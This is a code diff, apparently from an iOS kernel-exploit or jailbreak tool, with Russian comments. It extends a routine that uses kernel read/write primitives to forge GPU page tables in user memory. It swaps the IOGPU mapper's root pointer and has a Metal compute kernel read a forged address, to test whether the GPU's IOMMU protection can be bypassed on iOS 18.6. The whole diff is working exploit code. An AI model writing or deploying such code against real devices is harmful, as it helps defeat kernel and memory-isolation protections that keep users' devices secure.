@@ -5325,6 +5325,7 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     }
     extern uint64_t kp_rc_kread64(uint64_t);
     extern void kp_rc_kwrite64(uint64_t, uint64_t);
+    extern void kreadbuf(uint64_t, void *, uint64_t);
 
     // 1. IOGPU user client (type 1 — единственный рабочий на 18.6)
     io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGPU"));
@@ -5368,16 +5369,100 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     GNOTE( [NSString stringWithFormat:@"  frame types: mapper=0x%x L1arr=0x%x L2=0x%x L3=0x%x (0x21=heap пишется, 0x17=IOMMU защищена)",
                ftMapper, ftL1arr, ftL2, ftL3]);
 
-    // 5. если mapper — heap ИЛИ userland (0x0b тоже пишется!): тест записи root-указателя
+    // 5. ПОЛНЫЙ ФОРЖ: фейковая цепочка таблиц в user-страницах → подмена root
+    //    в mapper+0x30 → GPU читает forged VA (= нашу целевую страницу).
     if (ftMapper == 0x21 || ftMapper == 0x0b) {
-        uint64_t orig = kp_rc_kread64(mapper + 0x30);
-        kp_rc_kwrite64(mapper + 0x30, orig);
-        uint64_t rb = kp_rc_kread64(mapper + 0x30);
-        GNOTE( [NSString stringWithFormat:@"  mapper root-ptr write test: %@ (rb=%#llx)",
-                   rb == orig ? @"ПИШЕТСЯ — можно подменить корень таблиц!" : @"не пишется", rb]);
-        GNOTE( @"  → путь: фейк-L1 в user-странице → mapper+0x30 = её phys → GPU ходит по нашим таблицам");
+        // наш pmap → ttep (для phys user-страниц)
+        mach_port_t tp = mach_thread_self();
+        uint64_t tva = [self rcResolveThreadKVA:tp];
+        mach_port_deallocate(mach_task_self(), tp);
+        uint64_t tro = kp_untag_ptr(kp_rc_kread64(tva + 0x3E8));
+        uint64_t sproc = kp_untag_ptr(kp_rc_kread64(tro + off_thread_ro_tro_proc));
+        uint64_t pro = kp_untag_ptr(kp_rc_kread64(sproc + off_proc_p_proc_ro));
+        uint64_t stask = kp_untag_ptr(kp_rc_kread64(pro + off_proc_ro_pr_task));
+        uint64_t smap = kp_untag_ptr(kp_rc_kread64(stask + off_task_map));
+        uint64_t spmap = kp_untag_ptr(kp_rc_kread64(smap + koffsetof(vm_map, pmap)));
+        uint64_t ttep = kp_untag_ptr(kp_rc_kread64(spmap + koffsetof(pmap, ttep)));
+        extern uint64_t vtophys(uint64_t, uint64_t);
+        GNOTE( [NSString stringWithFormat:@"  ttep=%#llx", ttep]);
+
+        // живой эталон PTE (attrs) из L3[0]
+        uint64_t livePTE = kp_rc_kread64(L3);
+        uint64_t attrs = livePTE & ~0xFFFFFFFFF000ULL;
+        GNOTE( [NSString stringWithFormat:@"  attrs эталона=%#llx", attrs]);
+
+        // 4 user-страницы: fakeL1, fakeL2, fakeL3, target
+        vm_address_t base = 0;
+        if (vm_allocate(mach_task_self(), &base, 0x10000, VM_FLAGS_ANYWHERE) != KERN_SUCCESS ||
+            mlock((void *)base, 0x10000) != 0) { GNOTE( @"FAIL: vm_allocate/mlock"); gGartLive = NO; return r; }
+        memset((void *)base, 0, 0x10000);
+        uint8_t *fakeL1 = (uint8_t *)base;
+        uint8_t *fakeL2 = (uint8_t *)base + 0x4000;
+        uint8_t *fakeL3 = (uint8_t *)base + 0x8000;
+        uint8_t *target = (uint8_t *)base + 0xC000;
+        memset(target, 0x37, 0x4000); // сентинель
+        uint64_t paL1 = vtophys(ttep, (uint64_t)fakeL1);
+        uint64_t paL2 = vtophys(ttep, (uint64_t)fakeL2);
+        uint64_t paL3 = vtophys(ttep, (uint64_t)fakeL3);
+        uint64_t paT = vtophys(ttep, (uint64_t)target);
+        GNOTE( [NSString stringWithFormat:@"  phys: L1=%#llx L2=%#llx L3=%#llx target=%#llx", paL1, paL2, paL3, paT]);
+        if (!paL1 || !paL2 || !paL3 || !paT) { GNOTE( @"FAIL: vtophys"); gGartLive = NO; return r; }
+
+        // фейк-таблицы = ПОЛНЫЕ копии реальных (чужие маппинги не ломаем)
+        kreadbuf(L1arr, fakeL1, 0x4000);
+        kreadbuf(L2, fakeL2, 0x4000);
+        kreadbuf(L3, fakeL3, 0x4000);
+        // переопределяем цепочку на нашу цель: VA 0x10000064000 (pc=16, pd=0, pt=100)
+        *(uint64_t *)(fakeL1 + 16 * 8) = (paL2 & 0xFFFFFFFFF000ULL) | 3;
+        *(uint64_t *)(fakeL2 + 0)     = (paL3 & 0xFFFFFFFFF000ULL) | 3;
+        *(uint64_t *)(fakeL3 + 100 * 8) = (paT & 0xFFFFFFFFF000ULL) | attrs;
+
+        // Metal: result-буфер ДО подмены (его PTE скопирована в фейк-цепочку)
+        __block uint64_t result = 0;
+        @autoreleasepool {
+            id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
+            id<MTLBuffer> rbuf = mtl ? [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared] : nil;
+            if (!rbuf) { GNOTE( @"FAIL: result buf"); }
+            else {
+                uint64_t rVA = rbuf.gpuAddress;
+                GNOTE( [NSString stringWithFormat:@"  result buf VA=%#llx (должен быть в pc=16/pd=0)", rVA]);
+                // подмена root: mapper+0x30 = kernel VA нашей fakeL1 (phystokv)
+                uint64_t origRoot = kp_rc_kread64(mapper + 0x30);
+                uint64_t fakeRootKV = gPrimitives.phystokv(paL1);
+                GNOTE( [NSString stringWithFormat:@"  подмена root: %#llx → %#llx", origRoot, fakeRootKV]);
+                kp_rc_kwrite64(mapper + 0x30, fakeRootKV);
+                kp_rc_kread64(mapper + 0x30); // barrier
+                // compute: читаем forged VA 0x10000064000 в out[0]
+                NSError *err = nil;
+                id<MTLLibrary> lib = [mtl newLibraryWithSource:
+                    @"kernel void rd(device ulong *out [[buffer(0)]]) { device ulong *p=(device ulong*)0x10000064000; out[0]=*p; }"
+                    options:nil error:&err];
+                id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"rd"] : nil;
+                id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
+                id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
+                id<MTLCommandBuffer> cb = q ? [q commandBuffer] : nil;
+                id<MTLComputeCommandEncoder> enc = cb ? [cb computeCommandEncoder] : nil;
+                if (enc) {
+                    [enc setComputePipelineState:pipe];
+                    [enc setBuffer:rbuf offset:0 atIndex:0];
+                    [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+                    [enc endEncoding];
+                    [cb commit];
+                    [cb waitUntilCompleted];
+                    result = *(volatile uint64_t *)rbuf.contents;
+                    GNOTE( [NSString stringWithFormat:@"  GPU прочитал forged VA → %#llx (%@)", result,
+                               result == 0x3737373737373737ULL ? @"GART READ РАБОТАЕТ — GPU видит нашу цель!" :
+                               result ? @"прочитано что-то (не сентинель)" : @"ноль/фолt"]);
+                } else GNOTE( [NSString stringWithFormat:@"  compute оборвался: %@", err]);
+                // restore root СРАЗУ
+                kp_rc_kwrite64(mapper + 0x30, origRoot);
+                GNOTE( [NSString stringWithFormat:@"  root восстановлен: %#llx", kp_rc_kread64(mapper + 0x30)]);
+            }
+        }
+        munlock((void *)base, 0x10000);
+        vm_deallocate(mach_task_self(), base, 0x10000);
     } else {
-        GNOTE( @"  mapper тоже защищён — путь через AGX code-exec (hibernation ctx ret)");
+        GNOTE( @"  mapper защищён — форж невозможен тут");
     }
     gGartLive = NO;
     return r;
